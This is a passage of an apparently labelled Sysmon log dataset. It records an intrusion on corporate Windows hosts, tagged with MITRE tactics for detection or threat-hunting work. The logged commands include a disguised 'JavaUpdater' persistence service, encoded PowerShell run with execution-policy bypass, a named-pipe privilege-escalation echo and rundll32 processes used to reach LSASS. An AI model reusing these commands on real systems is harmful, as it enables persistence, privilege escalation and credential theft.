@@ -1,0 +1,1471 @@
+datetime,subject,raw,pid,ppid,process_name,parent_process_name,cmdline,user,report_desc,mitre_tactic
+2022-08-05 22:00:05+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:00:05.210061900Z""/>
+    <EventRecordID>136095</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:00:05.054</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-92E5-62ED-0000-001009569E01}</Data>
+    <Data Name=""ProcessId"">4860</Data>
+    <Data Name=""Image"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
+    <Data Name=""FileVersion"">?</Data>
+    <Data Name=""Description"">?</Data>
+    <Data Name=""Product"">?</Data>
+    <Data Name=""Company"">?</Data>
+    <Data Name=""CommandLine"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=322C3BCA32697C473B04F8EEF068BF84,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-6517-62ED-0000-00107C940000}</Data>
+    <Data Name=""ParentProcessId"">508</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
+  </EventData>
+</Event>
+",4860,508,\\127.0.0.1\ADMIN$\27f96ba.exe,C:\Windows\System32\services.exe,\\127.0.0.1\ADMIN$\27f96ba.exe,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:00:06+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:00:06.152225500Z""/>
+    <EventRecordID>136100</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:00:06.152</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
+    <Data Name=""ProcessId"">1604</Data>
+    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-92E5-62ED-0000-001009569E01}</Data>
+    <Data Name=""ParentProcessId"">4860</Data>
+    <Data Name=""ParentImage"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
+    <Data Name=""ParentCommandLine"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
+  </EventData>
+</Event>
+",1604,4860,C:\Windows\SysWOW64\rundll32.exe,\\127.0.0.1\ADMIN$\27f96ba.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
+2022-08-05 22:01:56+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:01:56.159353000Z""/>
+    <EventRecordID>136744</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:01:56.143</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-9354-62ED-0000-0010139DA301}</Data>
+    <Data Name=""ProcessId"">7012</Data>
+    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
+    <Data Name=""ParentProcessId"">1604</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",7012,1604,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
+2022-08-05 22:05:57+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:05:57.429914400Z""/>
+    <EventRecordID>137709</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:05:57.383</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-9445-62ED-0000-00104856AB01}</Data>
+    <Data Name=""ProcessId"">2812</Data>
+    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
+    <Data Name=""ParentProcessId"">1604</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",2812,1604,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
+2022-08-05 22:12:18+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:12:18.484964700Z""/>
+    <EventRecordID>139028</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:12:18.469</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-95C2-62ED-0000-00105F3BB401}</Data>
+    <Data Name=""ProcessId"">4324</Data>
+    <Data Name=""Image"">C:\Windows\SysWOW64\cmd.exe</Data>
+    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+    <Data Name=""Description"">Windows Command Processor</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /C sc create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""</Data>
+    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=AD7B9C14083B52BC532FBA5948342B98,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
+    <Data Name=""ParentProcessId"">1604</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",4324,1604,C:\Windows\SysWOW64\cmd.exe,C:\Windows\SysWOW64\rundll32.exe,"C:\Windows\system32\cmd.exe /C sc create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""",NT AUTHORITY\SYSTEM,,
+2022-08-05 22:12:18+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:12:18.563126200Z""/>
+    <EventRecordID>139029</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:12:18.547</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-95C2-62ED-0000-0010D841B401}</Data>
+    <Data Name=""ProcessId"">4168</Data>
+    <Data Name=""Image"">C:\Windows\SysWOW64\sc.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">A tool to aid in developing services for WindowsNT</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">sc  create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""</Data>
+    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=D2F7A0ADC2EE0F65AB1F19D2E00C16B8,IMPHASH=8B24AF806035DDC8FD70B1C3134CCC3E</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-95C2-62ED-0000-00105F3BB401}</Data>
+    <Data Name=""ParentProcessId"">4324</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\cmd.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\system32\cmd.exe /C sc create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""</Data>
+  </EventData>
+</Event>
+",4168,4324,C:\Windows\SysWOW64\sc.exe,C:\Windows\SysWOW64\cmd.exe,"sc  create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""",NT AUTHORITY\SYSTEM,,
+2022-08-05 22:13:07+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:13:07.173021000Z""/>
+    <EventRecordID>139101</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:13:07.157</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-95F3-62ED-0000-0010DF86B401}</Data>
+    <Data Name=""ProcessId"">4448</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
+    <Data Name=""ParentProcessId"">1604</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",4448,1604,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:13:54+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:13:54.162969700Z""/>
+    <EventRecordID>139173</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:13:54.147</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-9622-62ED-0000-0010C3C4BC01}</Data>
+    <Data Name=""ProcessId"">4516</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
+    <Data Name=""ParentProcessId"">1604</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",4516,1604,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:16:29+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:16:29.841973300Z""/>
+    <EventRecordID>140154</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:16:29.826</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-96BD-62ED-0000-0010C5E8C401}</Data>
+    <Data Name=""ProcessId"">596</Data>
+    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
+    <Data Name=""ParentProcessId"">1604</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",596,1604,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
+2022-08-05 22:16:30+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:16:30.453749600Z""/>
+    <EventRecordID>140158</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1428"" ThreadID=""1916""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-10.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:16:30.453</Data>
+    <Data Name=""ProcessGuid"">{140A6FA9-96BE-62ED-0000-001091EEC401}</Data>
+    <Data Name=""ProcessId"">3408</Data>
+    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
+    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+    <Data Name=""Description"">Windows Command Processor</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo e3140eabda6 &gt; \\.\pipe\d99345</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{140A6FA9-96BE-62ED-0000-00203AEEC401}</Data>
+    <Data Name=""LogonId"">0x0000000001c4ee3a</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
+    <Data Name=""ParentProcessGuid"">{140A6FA9-96BD-62ED-0000-0010C5E8C401}</Data>
+    <Data Name=""ParentProcessId"">596</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+  </EventData>
+</Event>
+",3408,596,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo e3140eabda6 &gt; \\.\pipe\d99345,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:17:30+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:17:30.025100400Z""/>
+    <EventRecordID>210329</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1992""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-01.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:17:30.025</Data>
+    <Data Name=""ProcessGuid"">{62886613-96FA-62ED-0000-0010B136C901}</Data>
+    <Data Name=""ProcessId"">2508</Data>
+    <Data Name=""Image"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
+    <Data Name=""FileVersion"">?</Data>
+    <Data Name=""Description"">?</Data>
+    <Data Name=""Product"">?</Data>
+    <Data Name=""Company"">?</Data>
+    <Data Name=""CommandLine"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{62886613-6435-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=48452DD856C05E2942D9311A4917BEA6,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
+    <Data Name=""ParentProcessGuid"">{62886613-6434-62ED-0000-001048930000}</Data>
+    <Data Name=""ParentProcessId"">476</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
+  </EventData>
+</Event>
+",2508,476,\\ACC-01\ADMIN$\b8a3848.exe,C:\Windows\System32\services.exe,\\ACC-01\ADMIN$\b8a3848.exe,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:17:31+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
